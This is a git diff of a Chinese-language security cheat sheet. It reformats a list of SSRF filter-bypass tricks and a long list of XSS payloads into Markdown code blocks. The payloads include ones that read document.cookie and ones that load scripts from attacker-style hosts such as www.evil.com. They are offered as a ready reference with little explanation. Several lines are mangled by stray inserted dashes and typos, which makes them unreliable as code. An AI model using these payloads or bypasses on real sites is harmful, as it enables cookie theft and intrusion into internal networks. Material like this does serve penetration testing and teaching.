@@ -4,54 +4,54 @@ SRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者�
 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。
 
 ## 常用绕过 payload等
-
-        使用@：http://A.com@10.10.10.10 = 10.10.10.10
-        IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
-        使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
-        端口绕过：ip后面加一个端口
-        xip.io：10.0.0.1.xip.io = 10.0.0.1
-                www.10.0.0.1.xip.io = 10.0.0.1
-                mysite.10.0.0.1.xip.io = 10.0.0.1
-                foo.bar.10.0.0.1.xip.io = 10.0.0.1
-        通过js跳转
-
+```
+使用@：http://A.com@10.10.10.10 = 10.10.10.10
+IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
+使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
+端口绕过：ip后面加一个端口
+xip.io：10.0.0.1.xip.io = 10.0.0.1
+        www.10.0.0.1.xip.io = 10.0.0.1
+        mysite.10.0.0.1.xip.io = 10.0.0.1
+        foo.bar.10.0.0.1.xip.io = 10.0.0.1
+       
+```
 ## XSS
 
 ## 常见payload
 
-```js
-<script>alert(1);</script>
-<img src=0 onerror=alert(1)>
-"><script src=http://www.xxx.com/1.js></script>"
-"></iframe><script>alert(123)></script>
-<body onLoad="while(true) alert("XSS"),">
-"></tile><script>alert(1111)</script>
-</textarea>'"><script>alert(document.cookie)</script>
-'""><script language="JavaScript"> alert("X \nS \nS"),</script>
-</script></script><<<<script><>>>><<<script>alert(123)</script>
-<html><noalert><noscript>(123)</noscript><script>(123)</script>
-<INPUTTYPE="IMAGE"SRC="javasctipt:alert("XSS");">
-'></select><script>alert(123)</script>
-'>'><script src='http://www.evil.com/XSS.js'></script>
-}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
-<SCRIPT>document.write("XSS");</SCRIPT>
-a="get";b="URL";c="javascript:";d="alert("XSS");";eval(a+b+c+d);
-='><script>alert("XSS")</script>
-<sctipt+src=">"+src="http://www.evil.com/XSS.js?68,69"></script>
-<body backgroud=jabascript:'"><script>alert(navigator.userAgent)</sctipt>></body>
-">XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/X
-Data:text/html;charset=utf-7;base64.Ij481.3RpdGod[jxzY3JpcHQ+YWxlcnQoMIMzNy
-"<marquee><img src=k.png onerror=alert(/XSS/)/>
-"<marquee><img src=k onerror=alert(/XSS/)>
-'"><marquee><img src=k.png onerror=alert(/XSS/.source)/>
-</div><script>alert(123)</script>
-"><iframe src="javascript:alert(document.cookie)'><iframe>
-<div style="backgroud:url("javascript:alert(I)')">
-<img src="java\nascript:alert(\"XSS\")">
->"><img src="javascript:alert("XSS")">
-"style="background:url(javascript:alert(/XSS/))"
->"><script>alert(/XSS/)</script>
-"></title><script>alert(I)</script>
+```html
+- <script>alert(1);</script>
+- <img src=0 onerror=alert(1)>
+- "><script src=http://www.xxx.com/1.js></script>"
+- "></iframe><script>alert(123)></script>
+- <body onLoad="while(true) alert("XSS"),">
+- "></tile><script>alert(1111)</script>
+- </textarea>'"><script>alert(document.cookie)</script>
+- '""><script language="JavaScript"> alert("X \nS \nS"),</- script>
+- </script></script><<<<script><>>>><<<script>alert(123)</- script>
+- <html><noalert><noscript>(123)</noscript><script>(123)</- script>
+- <INPUTTYPE="IMAGE"SRC="javasctipt:alert("XSS");">
+- '></select><script>alert(123)</script>
+- '>'><script src='http://www.evil.com/XSS.js'></script>
+- }</style><script>a=eval;b=alert;a(b(/XSS/.source));</- script>
+- <SCRIPT>document.write("XSS");</SCRIPT>
+- a="get";b="URL";c="javascript:";d="alert("XSS");";eval(a- +b+c+d);
+- ='><script>alert("XSS")</script>
+- <sctipt+src=">"+src="http://www.evil.com/XSS.js?68,- 69"></script>
+- <body backgroud=jabascript:'"><script>alert- (navigator.userAgent)</sctipt>></body>
+- ">XaDoS/><script>alert(document.cookie)</script><script - src="http://www.site.com/X
+- Data:text/html;charset=utf-7;base64.Ij481.3RpdGod- [jxzY3JpcHQ+YWxlcnQoMIMzNy
+- "<marquee><img src=k.png onerror=alert(/XSS/)/>
+- "<marquee><img src=k onerror=alert(/XSS/)>
+- '"><marquee><img src=k.png onerror=alert(/XSS/.source)/>
+- </div><script>alert(123)</script>
+- "><iframe src="javascript:alert(document.cookie)- '><iframe>
+- <div style="backgroud:url("javascript:alert(I)')">
+- <img src="java\nascript:alert(\"XSS\")">
+- >"><img src="javascript:alert("XSS")">
+- "style="background:url(javascript:alert(/XSS/))"
+- >"><script>alert(/XSS/)</script>
+- "></title><script>alert(I)</script>
 ```
 反射XSS:欺骗用户点击，可能会被浏览器过滤
 
